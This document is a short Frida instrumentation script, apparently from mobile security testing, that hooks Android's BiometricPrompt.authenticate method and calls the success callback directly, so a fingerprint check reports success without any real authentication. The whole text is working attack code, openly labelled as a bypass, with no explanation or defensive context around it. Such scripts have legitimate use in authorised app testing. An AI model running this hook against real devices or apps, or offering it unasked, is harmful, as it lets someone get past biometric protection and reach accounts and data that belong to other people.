// Script: biometric_bypass.js
// Target: Android BiometricPrompt
// Bypasses: Fingerprint checks returning success

Java.perform(function () {
    try {
        var BiometricPrompt = Java.use("android.hardware.biometrics.BiometricPrompt");
        BiometricPrompt.authenticate.overload('android.os.CancellationSignal', 'java.util.concurrent.Executor', 'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback').implementation = function (cancel, executor, callback) {
            send("[BIO-BYPASS] Bypassing BiometricPrompt.authenticate()");
            callback.onAuthenticationSucceeded(null);
        };
    } catch (e) { send("[BIO-BYPASS] Error hooking BiometricPrompt: " + e); }
});
